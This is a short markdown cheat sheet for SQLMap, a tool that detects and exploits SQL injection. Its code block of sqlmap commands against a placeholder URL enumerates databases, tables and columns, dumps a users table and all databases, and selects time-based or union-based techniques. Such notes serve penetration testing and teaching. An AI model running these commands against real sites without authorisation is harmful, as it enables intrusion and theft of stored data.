## ðŸ§¬ SQLMap â€“ SQL Injection Exploitation Tool

**SQLMap** is a powerful command-line tool used to detect and exploit SQL injection vulnerabilities in web applications.  
It supports multiple SQL injection techniques including boolean-based, time-based, error-based, union-based, and stacked queries.

SQLMap automates the entire process of identifying injectable parameters and extracting database information.

### ðŸ”¹ Common SQLMap Usage

```bash
# Basic SQL injection scan
sqlmap -u "https://www.example.com/page?id=1"

# Run non-interactively (recommended for automation)
sqlmap -u "https://www.example.com/page?id=1" --batch

# Suppress most output (useful for scripting)
sqlmap -u "https://www.example.com/page?id=1" --quiet

# Detect SQL injection and list databases
sqlmap -u "https://www.example.com/page?id=1" --dbs

# Enumerate tables in a specific database
sqlmap -u "https://www.example.com/page?id=1" -D dbname --tables

# Enumerate columns in a table
sqlmap -u "https://www.example.com/page?id=1" -D dbname -T users --columns

# Dump data from a specific table
sqlmap -u "https://www.example.com/page?id=1" -D dbname -T users --dump

# Dump all databases
sqlmap -u "https://www.example.com/page?id=1" --all-dbs

# Time-based blind SQL injection
sqlmap -u "https://www.example.com/page?id=1" --technique=T --time-sec=5

# Union-based SQL injection
sqlmap -u "https://www.example.com/page?id=1" --technique=U

# Inject using POST data
sqlmap -u "https://www.example.com/page?id=1" --data="param=value"

# Save output to a custom directory
sqlmap -u "https://www.example.com/page?id=1" --output-dir=sqlmap_results

# Use SQLMap configuration file
sqlmap -c sqlmapconfig.conf
